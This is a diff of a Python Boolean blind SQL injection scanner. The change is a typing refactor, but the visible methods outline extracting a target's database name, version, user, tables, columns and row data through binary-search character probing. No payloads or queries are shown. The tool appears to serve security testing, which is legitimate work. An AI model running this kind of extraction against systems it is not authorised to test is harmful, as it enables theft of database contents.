@@ -13,9 +13,9 @@ Detects and exploits Boolean Blind SQLi vulnerabilities.
 
 from __future__ import annotations
 
-import time
 import logging
-from typing import List, Optional, Tuple, Dict, Any
+import time
+from typing import Any
 
 from app.modules.scanner.core.base_scanner import BaseScanner
 from app.modules.scanner.modules.blind_payloads import BlindPayloadGenerator
@@ -31,13 +31,13 @@ class BlindBooleanScanner(BaseScanner):
     def __init__(self, target: str):
         super().__init__(target)
         self.payload_gen = BlindPayloadGenerator()
-        self.dbms: Optional[str] = None
+        self.dbms: str | None = None
         self.parameter: str = "category"
-        self.true_payload: Optional[str] = None
-        self.false_payload: Optional[str] = None
-        self.baseline_response: Optional[Any] = None
-        self.true_response: Optional[Any] = None
-        self.false_response: Optional[Any] = None
+        self.true_payload: str | None = None
+        self.false_payload: str | None = None
+        self.baseline_response: Any | None = None
+        self.true_response: Any | None = None
+        self.false_response: Any | None = None
         self.is_boolean_vulnerable: bool = False
         self.max_retries: int = 3
         self.retry_delay: float = 1.0
@@ -120,7 +120,7 @@ class BlindBooleanScanner(BaseScanner):
         logger.info("[BlindBoolean] ❌ Boolean Blind SQLi not detected")
         return False
 
-    def extract_database(self) -> Optional[str]:
+    def extract_database(self) -> str | None:
         """Extract database name using Boolean Blind SQLi."""
         if not self.is_boolean_vulnerable:
             return None
@@ -132,7 +132,7 @@ class BlindBooleanScanner(BaseScanner):
             logger.info(f"[BlindBoolean] ✅ Database: {result}")
         return result
 
-    def extract_version(self) -> Optional[str]:
+    def extract_version(self) -> str | None:
         """Extract database version using Boolean Blind SQLi."""
         if not self.is_boolean_vulnerable:
             return None
@@ -144,7 +144,7 @@ class BlindBooleanScanner(BaseScanner):
             logger.info(f"[BlindBoolean] ✅ Version: {result}")
         return result
 
-    def extract_user(self) -> Optional[str]:
+    def extract_user(self) -> str | None:
         """Extract current user using Boolean Blind SQLi."""
         if not self.is_boolean_vulnerable:
             return None
@@ -156,7 +156,7 @@ class BlindBooleanScanner(BaseScanner):
             logger.info(f"[BlindBoolean] ✅ User: {result}")
         return result
 
-    def extract_tables(self) -> List[str]:
+    def extract_tables(self) -> list[str]:
         """Extract table names using Boolean Blind SQLi."""
         if not self.is_boolean_vulnerable:
             return []
@@ -177,11 +177,11 @@ class BlindBooleanScanner(BaseScanner):
             table_name = self._extract_string(query)
             if table_name:
                 tables.append(table_name)
-                logger.info(f"[BlindBoolean]   Table {i+1}: {table_name}")
+                logger.info(f"[BlindBoolean]   Table {i + 1}: {table_name}")
 
         return tables
 
-    def extract_columns(self, table: str) -> List[str]:
+    def extract_columns(self, table: str) -> list[str]:
         """Extract column names from a table using Boolean Blind SQLi."""
         if not self.is_boolean_vulnerable:
             return []
@@ -202,11 +202,11 @@ class BlindBooleanScanner(BaseScanner):
             column_name = self._extract_string(query)
             if column_name:
                 columns.append(column_name)
-                logger.info(f"[BlindBoolean]   Column {i+1}: {column_name}")
+                logger.info(f"[BlindBoolean]   Column {i + 1}: {column_name}")
 
         return columns
 
-    def extract_data(self, table: str, column: str, limit: int = 100) -> List[str]:
+    def extract_data(self, table: str, column: str, limit: int = 100) -> list[str]:
         """Extract data from a table using Boolean Blind SQLi."""
         if not self.is_boolean_vulnerable:
             return []
@@ -219,13 +219,13 @@ class BlindBooleanScanner(BaseScanner):
             value = self._extract_string(query)
             if value:
                 data.append(value)
-                logger.info(f"[BlindBoolean]   Row {i+1}: {value}")
+                logger.info(f"[BlindBoolean]   Row {i + 1}: {value}")
             else:
                 break
 
         return data
 
-    def _extract_string(self, query: str) -> Optional[str]:
+    def _extract_string(self, query: str) -> str | None:
         """
         Extract a string value using Boolean Blind SQLi.
         Uses binary search for efficient extraction.
@@ -274,7 +274,7 @@ class BlindBooleanScanner(BaseScanner):
 
         return result
 
-    def _extract_char_at_position(self, query: str, position: int) -> Optional[str]:
+    def _extract_char_at_position(self, query: str, position: int) -> str | None:
         """
         Extract a single character at a position using binary search.
 
@@ -304,7 +304,7 @@ class BlindBooleanScanner(BaseScanner):
 
         return None
 
-    def _extract_integer(self, query: str) -> Optional[int]:
+    def _extract_integer(self, query: str) -> int | None:
         """Extract an integer value using Boolean Blind SQLi."""
         if not self.true_payload or not self.false_payload:
             return None
@@ -362,7 +362,7 @@ class BlindBooleanScanner(BaseScanner):
             logger.debug(f"[BlindBoolean] Request failed: {e}")
             return None
 
-    def _send_request_with_retry(self, payload: str) -> Optional[Any]:
+    def _send_request_with_retry(self, payload: str) -> Any | None:
         """Send request with retry logic."""
         for attempt in range(self.max_retries):
             response = self._send_request(payload)
